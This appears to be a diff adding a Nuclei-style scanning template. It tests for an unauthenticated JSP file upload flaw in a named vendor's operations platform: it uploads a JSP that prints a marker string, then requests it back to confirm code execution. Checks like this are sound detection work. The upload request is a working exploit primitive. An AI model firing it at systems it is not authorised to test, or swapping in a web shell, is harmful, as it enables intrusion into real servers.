@@ -1,0 +1,48 @@
+id: zkwj-word-upload
+
+info:
+  name: zkwj-word-upload
+  author: 思沃科技
+  severity: high
+  description: 北京中科聚网信息技术有限公司一体化运营平台word接口存在文件上传漏洞
+
+http:
+  - raw:
+      - |
+        POST /resources/files/ue/word HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Accept-Language: en-US;q=0.9,en;q=0.8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
+        Connection: close
+        Cache-Control: max-age=0
+        Content-Type: multipart/form-data; boundary=----3d8fa3de-dc1d-4a24-a272-f3e448e5c961
+        Content-Length: 205
+        Cookie:  JSESSIONID=9438c497-92ad-4800-b821-20602adec4ac; rememberMe=DQcKKIuzT47bdNWUqrwbm7lus89+rcIV76T4gjLO4SphCJRw6gxullXR9udKkk6i/NG7Uc60WHRESX9EwHokmstMa2I3K9puNySoBrRpTwPiNnHPT/YkOE2GDlu+DQ1gaUbw9GCWuWEB3fW+kigscyqkXJOPO66Y29tLjWQPy5I0B5Fb9guaGXbzLs27Jf0miwE=; 
+        
+        ------3d8fa3de-dc1d-4a24-a272-f3e448e5c961
+        Content-Disposition: form-data; name="file"; filename="test33.jsp"
+        Content-Type: application/octet-stream
+        
+        <%out.println("sectest112233");%>
+        ------3d8fa3de-dc1d-4a24-a272-f3e448e5c961--
+
+      - | 
+        GET /files/headimg/{{wenj}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/plain
+        Connection: close
+
+    extractors:
+    
+      - type: regex
+        part: all
+        internal: true
+        name: wenj
+        regex:
+          - ([0-9a-z]{8}\-)([0-9a-z]{4}\-)([0-9a-z]{4}\-)([0-9a-z]{4}\-)([0-9a-z]{12})
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains(body,'sectest112233')"
